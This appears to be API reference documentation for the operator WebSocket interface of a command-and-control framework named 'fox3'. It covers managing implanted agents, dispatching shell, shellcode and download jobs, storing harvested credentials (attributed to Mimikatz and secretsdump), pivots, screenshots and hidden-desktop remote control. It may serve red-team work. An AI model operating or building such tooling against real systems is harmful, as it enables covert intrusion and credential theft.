# WebSocket API Reference

All operator interaction with the server goes through a single WebSocket endpoint. The REST login endpoint issues a JWT used to authenticate the WebSocket connection.

---

## Endpoints

| Endpoint | Method | Auth | Description |
|---|---|---|---|
| `/api/login` | POST | none | Authenticate and receive a JWT |
| `/api/ws` | WebSocket | JWT | Bidirectional message bus |

---

## Authentication

### 1. Login

```
POST /api/login
Content-Type: application/json
```

**Request body**

```json
{ "password": "fox3" }
```

**Response — success (200)**

```json
{ "token": "<JWT>" }
```

**Response — failure (401)**

Plain-text error. After 5 consecutive failures from the same IP the endpoint returns `429 Too Many Requests` for 15 minutes.

The JWT is valid for **24 hours** and is signed with HMAC-SHA256 using the server's `--password` flag value as the secret.

### 2. Connect WebSocket

Pass the token as a header or query parameter:

```
ws://localhost:8080/api/ws
Authorization: Bearer <JWT>
```

or

```
ws://localhost:8080/api/ws?token=<JWT>
```

The query-parameter form exists for browser clients (EventSource API doesn't support custom headers).

---

## Message framing

### Client → server (request)

```json
{
  "id":      "req-001",
  "action":  "<action-name>",
  "payload": { }
}
```

- `id` — correlation ID; echoed back in the response. Use any unique string.
- `action` — one of the action names listed below.
- `payload` — action-specific map.

### Server → client (response)

```json
{
  "id":      "req-001",
  "type":    "response",
  "success": true,
  "payload": { },
  "error":   ""
}
```

- `success: false` means `payload` is absent and `error` contains the reason.

### Server → client (push event)

```json
{
  "type":    "event",
  "event":   "<event-name>",
  "payload": { }
}
```

Push events are unsolicited. They arrive when agents check in, jobs complete, or listeners start/stop.

### Server → client (binary — HVNC)

Binary WebSocket frames are used exclusively for HVNC screen streaming:

```
[16 bytes]  agent UUID (binary, little-endian)
[4 bytes]   frame width  (uint32 LE)
[4 bytes]   frame height (uint32 LE)
[N bytes]   JPEG image data
```

---

## Actions

### Stats

#### `stats.get`

Returns high-level counts.

**Payload**: none

**Response payload**

```json
{
  "agents":      3,
  "listeners":   2,
  "credentials": 7
}
```

---

### Agents

#### `agents.list`

Returns all agents currently tracked in memory.

**Payload**: none

**Response payload** — array of agent objects

```json
[
  {
    "id":           "550e8400-e29b-41d4-a716-446655440000",
    "platform":     "windows/amd64",
    "host":         "DESKTOP-ABC123",
    "user":         "DESKTOP-ABC123\\victim",
    "process":      "explorer.exe",
    "status":       "Active",
    "alive":        true,
    "note":         "",
    "integrity":    3,
    "links":        [],
    "last_checkin": "2026-05-30T12:00:00Z",
    "sleep":        "30s"
  }
]
```

`status` is computed from last check-in time relative to the agent's sleep interval:
- `Active` — checked in within one sleep period
- `Delayed` — between one and three sleep periods
- `Dead` — more than three sleep periods
- `Init` — never checked in

`integrity` mirrors Windows integrity levels: 1=Low, 2=Medium, 3=High, 4=System.

#### `agents.get`

**Payload**

```json
{ "id": "<agent-uuid>" }
```

**Response payload** — single agent object (same shape as above)

#### `agent.delete`

Removes agent from memory and deletes associated pivots and screenshots.

**Payload**

```json
{ "id": "<agent-uuid>" }
```

**Response payload**

```json
{ "status": "removed" }
```

#### `agent.note`

Set a free-text note on an agent.

**Payload**

```json
{ "id": "<agent-uuid>", "note": "lateral moved from webserver" }
```

**Response payload**

```json
{ "status": "updated" }
```

---

### Jobs

#### `job.create`

Dispatch a command to an agent.

**Payload**

```json
{
  "agent_id": "<agent-uuid>",
  "type":     "<command>",
  "args":     ["arg1", "arg2"]
}
```

- `type` — the command name (see [commands.md](commands.md))
- `args` — optional string array of arguments; omit or pass `[]` for no-arg commands

**Response payload**

```json
{ "message": "Created job <job-id> for agent <agent-uuid> at <timestamp>" }
```

**Examples**

```json
{ "agent_id": "550e...", "type": "ls",         "args": ["C:\\Users"] }
{ "agent_id": "550e...", "type": "shell",       "args": ["whoami /all"] }
{ "agent_id": "550e...", "type": "sleep",       "args": ["60s"] }
{ "agent_id": "550e...", "type": "download",    "args": ["C:\\sensitive.txt"] }
{ "agent_id": "550e...", "type": "shellcode",   "args": ["<b64>", "self"] }
{ "agent_id": "550e...", "type": "exit",        "args": [] }
```

Broadcast to all agents using the sentinel UUID `ffffffff-ffff-ffff-ffff-ffffffffffff`.

#### `jobs.list`

Get jobs for an agent (active + last 50 completed).

**Payload**

```json
{ "agent_id": "<agent-uuid>" }
```

**Response payload** — array of job objects

```json
[
  {
    "id":       "<job-uuid>",
    "agent_id": "<agent-uuid>",
    "command":  "ls C:\\Users",
    "status":   "Complete",
    "created":  "2026-05-30T12:00:00Z",
    "sent":     "2026-05-30T12:00:05Z",
    "output":   "Volume in drive C...\n..."
  }
]
```

#### `jobs.clear`

Remove all unsent (queued) jobs for an agent.

**Payload**

```json
{ "agent_id": "<agent-uuid>" }
```

**Response payload**

```json
{ "status": "cleared" }
```

---

### Listeners

#### `listeners.list`

**Payload**: none

**Response payload** — array of listener objects

```json
[
  {
    "id":          "<listener-uuid>",
    "name":        "https-443",
    "protocol":    "https",
    "bind_addr":   "0.0.0.0:443",
    "status":      "Active",
    "description": ""
  }
]
```

#### `listeners.options`

Get default options for a given protocol.

**Payload**

```json
{ "protocol": "https" }
```

**Response payload** — map of option names to default values

#### `listener.create`

The entire payload is the options map. All listener option keys go directly in `payload`.

**Payload** (HTTP/HTTPS example)

```json
{
  "Protocol":    "https",
  "Name":        "https-443",
  "Interface":   "0.0.0.0",
  "Port":        "443",
  "PSK":         "change-me",
  "X509Cert":    "/etc/ssl/certs/server.crt",
  "X509Key":     "/etc/ssl/private/server.key",
  "Transforms":  "jwe,json",
  "Authenticator": "none",
  "Description": "Primary HTTPS listener"
}
```

See [listeners.md](listeners.md) for all options per listener type.

**Response payload** — listener object (same shape as `listeners.list` entries)

#### `listener.start`

**Payload**

```json
{ "id": "<listener-uuid>" }
```

**Response payload**

```json
{ "status": "started" }
```

#### `listener.stop`

**Payload**

```json
{ "id": "<listener-uuid>" }
```

**Response payload**

```json
{ "status": "stopped" }
```

#### `listener.delete`

Stops the listener (if running) then removes it.

**Payload**

```json
{ "id": "<listener-uuid>" }
```

**Response payload**

```json
{ "status": "deleted" }
```

---

### Credentials

#### `credentials.list`

**Payload**: none

**Response payload** — array of credential objects

```json
[
  {
    "id":       "<uuid>",
    "domain":   "CORP",
    "username": "administrator",
    "password": "Password1",
    "hash":     "aad3...",
    "source":   "Mimikatz",
    "agent_id": "<agent-uuid>",
    "created":  "2026-05-30T12:00:00Z"
  }
]
```

#### `credential.create`

**Payload**

```json
{
  "domain":   "CORP",
  "username": "svc-account",
  "password": "",
  "hash":     "aad3b435b51404eeaad3b435b51404ee",
  "source":   "secretsdump",
  "agent_id": "<agent-uuid>"
}
```

All fields are optional except `username`. `agent_id` defaults to nil UUID.

**Response payload** — created credential object

#### `credential.delete`

**Payload**

```json
{ "id": "<credential-id>" }
```

---

### Screenshots

#### `screenshots.list`

**Payload**: none

**Response payload**

```json
[
  {
    "id":       "<uuid>",
    "agent_id": "<agent-uuid>",
    "note":     "",
    "size":     142365,
    "created":  "2026-05-30T12:00:00Z"
  }
]
```

#### `screenshots.image`

Retrieve screenshot binary as base64.

**Payload**

```json
{ "id": "<screenshot-uuid>" }
```

**Response payload**

```json
{ "data": "<base64-encoded-PNG/JPEG>" }
```

#### `screenshot.create`

Manually record a screenshot (the `screenshot` job command does this automatically).

**Payload**

```json
{
  "agent_id": "<agent-uuid>",
  "data":     "<base64>",
  "note":     "optional note"
}
```

#### `screenshot.delete`

**Payload**

```json
{ "id": "<screenshot-uuid>" }
```

---

### Topology

#### `topology.get`

Returns the full agent/listener network graph for visualisation.

**Payload**: none

**Response payload**

```json
{
  "nodes": [
    { "id": "server",         "label": "fox3 server", "group": "server" },
    { "id": "<listener-uuid>","label": "https-443",   "group": "listener" },
    { "id": "<agent-uuid>",   "label": "DESKTOP-ABC", "group": "agent", "integrity": 3, "status": "Active" }
  ],
  "edges": [
    { "from": "server",         "to": "<listener-uuid>" },
    { "from": "<listener-uuid>","to": "<agent-uuid>" }
  ]
}
```

---

### Pivots

#### `pivots.list`

**Payload**: none

**Response payload**

```json
[
  {
    "id":              "<uuid>",
    "name":            "smb-pivot-1",
    "parent_agent_id": "<agent-uuid>",
    "child_agent_id":  "<agent-uuid>",
    "protocol":        "smb",
    "created":         "2026-05-30T12:00:00Z"
  }
]
```

#### `pivot.create`

**Payload**

```json
{
  "name":            "smb-pivot-1",
  "parent_agent_id": "<agent-uuid>",
  "child_agent_id":  "<agent-uuid>",
  "protocol":        "smb"
}
```

#### `pivot.delete`

**Payload**

```json
{ "id": "<pivot-uuid>" }
```

---

### HVNC

HVNC (Hidden VNC) streams desktop frames as binary WebSocket messages. Start it by dispatching `hvnc_start` to an agent (Windows only), then manage the session with these actions.

#### `hvnc.status`

**Payload**

```json
{ "agent_id": "<agent-uuid>" }
```

**Response payload**

```json
{ "active": true, "conn_id": "<uuid>" }
```

#### `hvnc.start`

Dispatches `hvnc_start` job to the agent and registers the session.

**Payload**

```json
{ "agent_id": "<agent-uuid>" }
```

#### `hvnc.stop`

Dispatches `hvnc_stop` job and unregisters the session.

**Payload**

```json
{ "agent_id": "<agent-uuid>" }
```

#### `hvnc.input`

Send keyboard/mouse input to the hidden desktop.

**Payload**

```json
{
  "agent_id": "<agent-uuid>",
  "type":     "mouse_click",
  "x":        100,
  "y":        200,
  "button":   "left"
}
```

#### `hvnc.launch`

Launch a process on the hidden desktop.

**Payload**

```json
{
  "agent_id": "<agent-uuid>",
  "command":  "cmd.exe"
}
```

#### `hvnc.quality`

Adjust JPEG compression quality for the frame stream.

**Payload**

```json
{
  "agent_id": "<agent-uuid>",
  "quality":  75
}
```

---

## Push events

Events arrive unsolicited from the server to all connected WebSocket clients.

| Event name | When | Payload |
|---|---|---|
| `agent_checkin` | Agent checks in | Full `AgentResponse` object |
| `agent_removed` | Agent deleted | `{"agent_id": "<uuid>"}` |
| `job_complete` | Job finishes | `{"agent_id": "<uuid>", "jobs": [<JobResponse>…]}` |
| `listener_start` | Listener created or started | `{"listener_id": "<uuid>"}` |
| `listener_stop` | Listener stopped or deleted | `{"listener_id": "<uuid>"}` or with `"deleted": "true"` |

---

## Error handling

All errors follow the same response envelope:

```json
{
  "id":      "req-001",
  "type":    "response",
  "success": false,
  "error":   "invalid agent_id: not-a-uuid"
}
```

Common errors:

| Error | Cause |
|---|---|
| `invalid agent_id` | UUID parse failure |
| `agent not found` | Agent not in memory (may have been removed) |
| `unknown action: <x>` | Typo in action name |
| `invalid listener id` | UUID parse failure on listener ID |
